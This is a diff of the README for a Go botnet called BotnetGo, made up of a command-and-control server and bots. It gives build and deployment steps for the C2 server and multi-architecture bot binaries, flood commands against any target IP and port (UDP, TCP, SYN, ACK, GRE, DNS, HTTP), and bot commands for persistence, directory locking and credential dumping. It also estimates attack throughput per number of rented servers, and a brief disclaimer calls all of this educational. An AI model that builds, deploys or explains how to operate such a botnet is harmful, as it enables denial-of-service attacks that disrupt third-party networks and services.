@@ -1,156 +1,109 @@
-# Golang Botnet focused on basic network stressing 
+# BotnetGo
 
-## A lil Youtube Video for an example / Demostration
-[For Users that need to see a live demo / Small bit of help setting up](https://www.youtube.com/watch?v=Xkm5yxWoNL8)
+Go-based CnC + bot for network stress testing across multiple architectures.
 
-V5 [Main Release](https://github.com/1Birdo/GoFlood), Now Released / in Last Development as we speak, This will combind both Gostress-V2 + BotnetGo as one big C2 Framework + REST API Web UI + Ternimal with Encryption and a Bi-directional Proxy.
+[Demo video](https://www.youtube.com/watch?v=Xkm5yxWoNL8)
 
->
-> 2025-04-N/A
->
->https://github.com/1Birdo/GoFlood
+V5 [Main Release](https://github.com/1Birdo/GoFlood) is now out — combines Gostress-V2 + BotnetGo into one C2 framework with a REST API, web UI, terminal, encryption, and bi-directional proxy.
 
-> 2024-09-20
->
-> Last Botnet Source Release, trying to do more alternative and better projects.
+> 2024-09-20 — Last standalone botnet source release before moving to GoFlood.
 
+![image1](https://github.com/user-attachments/assets/812f9717-c037-4399-ba57-e9bf4f610326)
 
-## Overview
-This project implements a simple Botnet Control and Command (CnC) server in Go, enabling users to manage connected bots and execute various network attack commands.
+## What it does
 
-## Features
-- **User Authentication**: Secure login and credential management.
-- **Bot Management**: Connect and manage multiple bots.
-- **Attack Execution**: Send commands to bots for executing different types of network attacks.
-- **Logging**: Track bot connections and actions.
+- Auth system with tiered accounts (Owner/Admin/Pro/Basic) and expiry dates
+- Manages bot connections over TCP, tracks online count
+- Dispatches flood commands to all connected bots
+- Supports UDP, TCP, SYN, ACK, GRE, DNS, and HTTP methods
+- Bot side has persistence, directory cleanup, and file locking
+- C alternative included under `device_Alternative/`
 
-## Prerequisites
-- Go 1.18 or higher
-- Terminal/command line interface
-- Basic understanding of Go and network programming
+## Requirements
 
-**![image1](https://github.com/user-attachments/assets/812f9717-c037-4399-ba57-e9bf4f610326)**
+- Go 1.18+
+- Linux for the bot binaries (cross-compiled via build.sh)
+- Ports below 1024 need root
 
+## Setup
 
-## Installation
-1. **Clone the repository**:
-   ```bash
-   git clone https://github.com/Birdo1221/BotnetGo.git
-   cd BotnetGo/cnc
-   ```
-2. **Install dependencies**:
-   ```bash
-   go mod init cnc
-   go mod tidy
-   ```
-3. **Build the project**:
-   ```bash
-   go build -o cnc *.go
-   ```
-4. **Run the server**:
-   If the any of the ports are defined below 1024,
-   you will need to run with sudo privilages to bind to that port.
-   I would also recommend running using ```screen``` to run with it so it
-   doesnt get killed for idle memory usage or kill the process after you close the program
-    ```bash
-   ./cnc
-    
-   sudo apt install screen 
-   screen ./cnc 
-   ```
-   
-6. **Running the Device / Bot files**:
-   You bascially want to enter into the ```bash Devices``` Directory
-   and do the exact same you did in the CNC directory
-   ```bash
-   cd ../device
-   ```
-   Then to build just run the build.sh script to make all the different arch types,
-   but if you just want to build it for standard x86 or just without defining anything just run
+**CnC server:**
+```bash
+cd cnc
+go mod init cnc
+go mod tidy
+go build -o cnc *.go
+./cnc
+```
 
-    ```bash
-    sh build.sh
-   ```
-    For without defining
-    ```bash
-     go build -o Botfile bot.go
-   ```
+If you're binding to a low port, use `sudo`. I'd recommend running it under `screen` so it doesn't die when you close your terminal:
+```bash
+sudo apt install screen
+screen ./cnc
+```
+
+**Bot binaries:**
+```bash
+cd device
+sh build.sh
+```
+
+That builds for x86, armv5, armv7, arm64, mips, and mipsel. If you just want a single binary:
+```bash
+go build -o bot bot.go
+```
 
 ## Configuration
-Edit the constants in `main.go` to configure:
-- **User and Bot Server IPs**: Adjust `USER_SERVER_IP` and `BOT_SERVER_IP`.
-- **Server Ports**: Modify `USER_SERVER_PORT` and `BOT_SERVER_PORT`.
-- **Killer**: Modify `killerEnabled` to `true` if you want to run on runtime and not when commanded to.
 
-**![image](https://github.com/user-attachments/assets/d5886f8c-1ac4-485d-b88c-b63a0acd51ff)**
+In `cnc/main.go`, edit the constants at the top:
+- `cncBindAddr` / `nodeBindAddr` — listener IPs
+- `cncPort` / `nodePort` — listener ports
+- `killEnabled` in `device/bot.go` — set to `true` to run directory cleanup on startup instead of on command
 
+In `device/bot.go`, set `serverAddr` to your CnC IP and port.
 
-## Usage
-- Start the server and connect your bots.
-- Use the CLI to log in and execute commands.
-  ### e.g. Termum, Mobaxterm or Putty
-- Attacks command to start an attack:
-  ```bash
-  !tcpflood <target_ip> <target_port> <duration>
-  !udpflood <target_ip> <target_port> <duration>
-  !udpsmart <target_ip> <target_port> <duration>
-  !syn <target_ip> <target_port> <duration>
-  !ack <target_ip> <target_port> <duration>
-  !gre <target_ip> <duration> // you will need to send a port anyway
-  !dns <target_ip> <target_port> <duration>
-  !http <target_ip> <target_port> <duration> // still in the works
-  ```
-- Alternative command to send:
-  ```bash
-  !kill
-  !lock
-  !persist
-  ```
+![image](https://github.com/user-attachments/assets/d5886f8c-1ac4-485d-b88c-b63a0acd51ff)
 
+## Commands
 
-  ## Logging in 
-1. **How to Login**:
-   On Line 290 there is a string that is prompted to be called for before being able to login to it
-   e.g. loginforme
+Connect via telnet/putty/termius to the CnC port. The initial prompt expects `loginforme` before showing the login screen. Credentials are in `users.json` (auto-generated on first run with a random root password).
 
+**Flood commands:**
+```
+!tcpflood <ip> <port> <seconds>
+!udpflood <ip> <port> <seconds>
+!udpsmart <ip> <port> <seconds>
+!synflood <ip> <port> <seconds>
+!ackflood <ip> <port> <seconds>
+!greflood <ip> <port> <seconds>
+!dns <ip> <port> <seconds>
+!http <ip> <port> <seconds>
+```
 
-2. **Users **:
+**Other:**
+```
+!kill       — clean directories on bots
+!lock       — lock directories with chattr
+!persist    — install systemd persistence on bots
+!reinstall  — re-download and restart bot binary
+bots        — show connected bot count
+db          — dump user credentials
+clear       — clear screen
+logout      — disconnect
+```
 
-   After that, you will be prompted to enter a username and password.
-   If you don't remember them, you can check the users.json file,
-   which contains the login information and more.  
+## Performance notes
 
-4.  **Future Development/ Power problem **:
- ```
-   When searching for a reliable source, one of the most significant concerns is the power it can deliver.
-   Many users face challenges when a single source does not meet their expectations,
-   they often switch to a differnt source or just abandon their search altogether.
+With 10–16 VPS nodes (1 core, 1GB RAM, 1Gbps each), expect roughly 30–40 Gbps on UDP methods. TCP methods typically land around 20–28 Gbps. Actual throughput depends on packet size, server output, and RTT to the target.
 
-   This source is designed to provide the expected performance. To start fully utilizing this source you
-   will need around 10 to 16 servers, each equipped with 1 core and 1 GB 
-   of RAM, and an output capacity of 1 Gbps, you can achieve approximately 30 to 40 Gbps for UDP traffic.
+Budget VPS hosts work fine for testing. Be aware that providers like OVH, Vultr, or Linode will suspend you for flooding.
 
-   I'd recommend using rental hosts for this purpose, as it allows you to create multiple server instances without
-   having to pay an entire upfront cost of buying several servers. On average, with a Command and Control (CNC) server
-   to test this would cost around 20 GBP (British Pounds) in Bitcoin.
-
-   You can obtain affordable servers by using a rental VPS service or a budget host.
-   However, be aware that VPS providers like OVH, Vultr, or Linode may terminate or suspend
-   your VPS due to bandwidth or flooding abuse.
-  ```
-Performance may vary based on several factors, including:
- ```bash
-   *.Packet size
-   *.Server output
-   *.RTT based on geolocation
-   ```
-For TCP methods, similar performance can be expected for each methods, typically ranging from 20 to 28 Gbps, though this is also influenced by various conditions.
-   
 ## Disclaimer
 
-#  ```This project is for educational purposes only. Ensure you have permission before testing any network security tools on remote servers. I bear no responsibility or obligation to anyone using this for malicious purposes. ```
+**This project is for educational purposes only.** Make sure you have authorization before testing against any target. I'm not responsible for misuse.
 
-DDoS attacks are a serious crime that disrupt critical infrastructure, causing significant damage. Initiatives like Operation PowerOFF and Operation Endgame have highlighted the growing threat, targeting cybercriminals behind DDoS-for-hire services. These operations emphasize that DDoS is no longer just a nuisance but a severe offense with real-world consequences, and those involved face legal repercussions.
+DDoS attacks are a serious crime. Operations like PowerOFF and Endgame have shown that law enforcement actively pursues people running or using these tools maliciously.
 
 ## License
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+
+MIT — see [LICENSE](LICENSE).
